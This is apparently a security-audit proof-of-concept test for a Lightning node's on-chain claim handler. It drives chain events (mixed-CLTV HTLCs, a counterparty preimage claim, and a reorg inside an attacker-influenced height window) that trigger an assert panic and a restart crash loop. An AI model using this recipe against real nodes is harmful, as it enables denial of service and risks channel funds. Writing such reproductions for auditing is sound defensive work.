	// ============================================================================
	// PoC for security-audit finding #1 (FINDING-1 in
	// security-audit/findings/lightning/src/chain/onchaintx.rs.md): a reorg that
	// resurrects an HTLC timeout claim previously split out of a mixed-CLTV
	// aggregated package hits
	// `assert!(request.merge_package(package, new_best_height + 1).is_ok())`
	// (lightning/src/chain/onchaintx.rs:1183) and panics in ALL build profiles.
	//
	// This payload is injected temporarily into `mod tests` of
	// lightning/src/chain/onchaintx.rs by poc/run.sh and relies only on names
	// already imported by that module (plus fully-qualified paths). It drives
	// `OnchainTxHandler` through the exact chain event sequence a channel
	// counterparty (who controls the HTLC CLTV expiries and owns the preimages)
	// can produce, with a reorg fork height inside the attacker-influenced
	// window [cltv1, cltv2 - 2]:
	//
	//   1. The counterparty's commitment confirms at height 110 (>= cltv2)
	//      carrying two HTLCs with CLTV expiries 100 and 110. Their timeout
	//      claims aggregate into one pending claim request because
	//      `package_locktime(110) == 110` for both.
	//   2. The counterparty claims the CLTV-100 HTLC with its preimage at
	//      height 110, splitting it out of the aggregated request and parking
	//      it as a `ContentiousOutpoint` event awaiting ANTI_REORG_DELAY.
	//   3. A reorg to fork height 105 (in [100, 108]) resurrects the split
	//      package. Merging it back fails the height-relative locktime check:
	//      `package_locktime(106)` is 106 for the resurrected package but 110
	//      for the surviving request, so `merge_package` returns `Err` and the
	//      assert panics.
	//
	// The scenario runs twice on identically-constructed handlers to model the
	// restart crash loop: in production the assert fires inside
	// `ChainMonitor::blocks_disconnected` before the updated state is
	// persisted, so on restart the node reloads the pre-reorg state, the block
	// source re-delivers the same disconnection, and the identical panic
	// recurs.
	// ============================================================================
	#[test]
	#[rustfmt::skip]
	fn test_blocks_disconnected_mixed_cltv_resurrection_panic() {
		let secp_ctx = Secp256k1::new();
		let per_commitment_point = PublicKey::from_secret_key(
			&secp_ctx,
			&SecretKey::from_slice(&[3; 32]).unwrap(),
		);

		let broadcaster = TestBroadcaster::new(Network::Testnet);
		let fee_estimator = TestFeeEstimator::new(253);
		let fee_estimator = LowerBoundedFeeEstimator::new(&fee_estimator);
		let logger = TestLogger::new();
		let destination_script = ScriptBuf::new();
		let conf_hash = bitcoin::hash_types::BlockHash::all_zeros();

		const CLTV1: u32 = 100;
		const CLTV2: u32 = 110;
		// C >= cltv2: both HTLCs expired when the commitment confirms, so the claims merge.
		const COMMITMENT_CONF_HEIGHT: u32 = 110;

		// Advance the test broadcaster's view of the chain to the commitment confirmation height
		// so broadcasting claims with locktime 110 passes its sanity checks.
		{
			let mut blocks = broadcaster.blocks.lock().unwrap();
			while blocks.last().unwrap().1 < COMMITMENT_CONF_HEIGHT {
				let next_height = blocks.last().unwrap().1 + 1;
				let prev_hash = blocks.last().unwrap().0.block_hash();
				blocks.push((create_dummy_block(prev_hash, 0, Vec::new()), next_height));
			}
		}

		// F in [cltv1, cltv2 - 2]: the resurrection-time locktimes diverge.
		const FORK_HEIGHT: u32 = 105;

		// Builds a fresh handler, runs the chain event sequence through the split (steps 1-2),
		// then delivers the reorg (step 3) and returns the resulting panic, if any.
		let run_scenario = || {
			let signer = InMemorySigner::new(
				SecretKey::from_slice(&[41; 32]).unwrap(),
				SecretKey::from_slice(&[41; 32]).unwrap(),
				SecretKey::from_slice(&[41; 32]).unwrap(),
				SecretKey::from_slice(&[41; 32]).unwrap(),
				true,
				SecretKey::from_slice(&[41; 32]).unwrap(),
				SecretKey::from_slice(&[41; 32]).unwrap(),
				[41; 32],
				[0; 32],
				[0; 32],
			);
			let counterparty_pubkeys = ChannelPublicKeys {
				funding_pubkey: PublicKey::from_secret_key(
					&secp_ctx,
					&SecretKey::from_slice(&[44; 32]).unwrap(),
				),
				revocation_basepoint: RevocationBasepoint::from(PublicKey::from_secret_key(
					&secp_ctx,
					&SecretKey::from_slice(&[45; 32]).unwrap(),
				)),
				payment_point: PublicKey::from_secret_key(
					&secp_ctx,
					&SecretKey::from_slice(&[46; 32]).unwrap(),
				),
				delayed_payment_basepoint: DelayedPaymentBasepoint::from(PublicKey::from_secret_key(
					&secp_ctx,
					&SecretKey::from_slice(&[47; 32]).unwrap(),
				)),
				htlc_basepoint: HtlcBasepoint::from(PublicKey::from_secret_key(
					&secp_ctx,
					&SecretKey::from_slice(&[48; 32]).unwrap(),
				)),
			};
			let funding_outpoint = OutPoint { txid: Txid::all_zeros(), index: u16::MAX };
			let chan_params = ChannelTransactionParameters {
				holder_pubkeys: signer.pubkeys(&secp_ctx),
				holder_selected_contest_delay: 66,
				is_outbound_from_holder: true,
				counterparty_parameters: Some(CounterpartyChannelTransactionParameters {
					pubkeys: counterparty_pubkeys,
					selected_contest_delay: 67,
				}),
				funding_outpoint: Some(funding_outpoint),
				splice_parent_funding_txid: None,
				channel_type_features: ChannelTypeFeatures::only_static_remote_key(),
				channel_value_satoshis: 0,
			};
			let counterparty_node_id = PublicKey::from_slice(&[2; 33]).unwrap();
			let mut tx_handler = OnchainTxHandler::new(
				ChannelId::from_bytes([0; 32]),
				counterparty_node_id,
				1000000,
				[0; 32],
				destination_script.clone(),
				signer,
				chan_params,
				HolderCommitmentTransaction::dummy(1000000, funding_outpoint, Vec::new()),
				Secp256k1::new(),
			);

			// Step 1: the counterparty's commitment confirms at height 110 with two HTLCs with
			// CLTV expiries 100 and 110; their timeout claims aggregate into one request.
			let counterparty_commit_txid = Txid::from_byte_array([42; 32]);
			let mut requests = Vec::new();
			for (vout, cltv_expiry) in [(0u32, CLTV1), (1u32, CLTV2)] {
				let preimage = PaymentPreimage([vout as u8; 32]);
				let hash = PaymentHash(Sha256::hash(&preimage.0[..]).to_byte_array());
				let htlc = HTLCOutputInCommitment {
					offered: true,
					amount_msat: 10_000_000,
					cltv_expiry,
					payment_hash: hash,
					transaction_output_index: Some(vout),
				};
				requests.push(PackageTemplate::build_package(
					counterparty_commit_txid,
					vout,
					PackageSolvingData::CounterpartyReceivedHTLCOutput(
						crate::chain::package::CounterpartyReceivedHTLCOutput::build(
							per_commitment_point,
							htlc,
							tx_handler.channel_transaction_parameters.clone(),
							Some(COMMITMENT_CONF_HEIGHT),
						),
					),
					0,
				));
			}
			tx_handler.update_claims_view_from_requests(
				requests,
				COMMITMENT_CONF_HEIGHT,
				COMMITMENT_CONF_HEIGHT,
				&&broadcaster,
				ConfirmationTarget::UrgentOnChainSweep,
				&destination_script,
				&fee_estimator,
				&logger,
			);
			assert_eq!(tx_handler.pending_claim_requests.len(), 1);
			let (claim_id, aggregated_request) =
				tx_handler.pending_claim_requests.iter().next().unwrap();
			assert_eq!(aggregated_request.outpoints().len(), 2);
			let claim_id = *claim_id;

			// Step 2: the counterparty claims the CLTV-100 HTLC with its preimage, splitting it
			// out of the aggregated request and parking it as a `ContentiousOutpoint` event.
			let attacker_preimage_tx = bitcoin::transaction::Transaction {
				version: bitcoin::transaction::Version(2),
				lock_time: bitcoin::locktime::absolute::LockTime::ZERO,
				input: vec![bitcoin::transaction::TxIn {
					previous_output: bitcoin::transaction::OutPoint {
						txid: counterparty_commit_txid,
						vout: 0,
					},
					script_sig: ScriptBuf::new(),
					sequence: bitcoin::Sequence::ENABLE_RBF_NO_LOCKTIME,
					witness: bitcoin::Witness::from_slice(&[
						vec![0x30; 72],
						vec![0; 32],
						vec![2; 105],
					]),
				}],
				output: vec![bitcoin::transaction::TxOut {
					value: bitcoin::amount::Amount::from_sat(9_000),
					script_pubkey: ScriptBuf::new(),
				}],
			};
			tx_handler.update_claims_view_from_matched_txn(
				&[&attacker_preimage_tx],
				COMMITMENT_CONF_HEIGHT,
				conf_hash,
				COMMITMENT_CONF_HEIGHT,
				&&broadcaster,
				ConfirmationTarget::UrgentOnChainSweep,
				&destination_script,
				&fee_estimator,
				&logger,
			);
			assert_eq!(
				tx_handler.pending_claim_requests.get(&claim_id).unwrap().outpoints().len(),
				1
			);
			assert!(tx_handler
				.onchain_events_awaiting_threshold_conf
				.iter()
				.any(|entry| matches!(&entry.event, super::OnchainEvent::ContentiousOutpoint { .. })));

			// Step 3: a >= 2-block reorg with fork height 105 in [cltv1, cltv2 - 2] resurrects
			// the split package; the merge back into the surviving request fails the
			// height-relative locktime check and the assert fires.
			std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
				tx_handler.blocks_disconnected(
					FORK_HEIGHT,
					&&broadcaster,
					ConfirmationTarget::UrgentOnChainSweep,
					&destination_script,
					&fee_estimator,
					&logger,
				);
			}))
		};

		let panic_message = |res: Result<(), Box<dyn std::any::Any + Send>>| {
			let err = res.err().expect(
				"FINDING-1: reorg resurrection of a mixed-CLTV split package panics on the \
				 infallible merge assert (release-mode crash)",
			);
			if let Some(s) = err.downcast_ref::<String>() {
				s.clone()
			} else if let Some(s) = err.downcast_ref::<&'static str>() {
				s.to_string()
			} else {
				String::new()
			}
		};

		let first_panic = panic_message(run_scenario());
		assert!(first_panic.contains("merge_package"), "unexpected panic: {first_panic}");

		// The assert fires before any state is persisted, so after a restart the block source
		// re-delivers the same disconnection to the reloaded pre-reorg state and the identical
		// panic recurs: the crash loop.
		let second_panic = panic_message(run_scenario());
		assert_eq!(first_panic, second_panic, "re-delivery panics identically (crash loop)");
	}
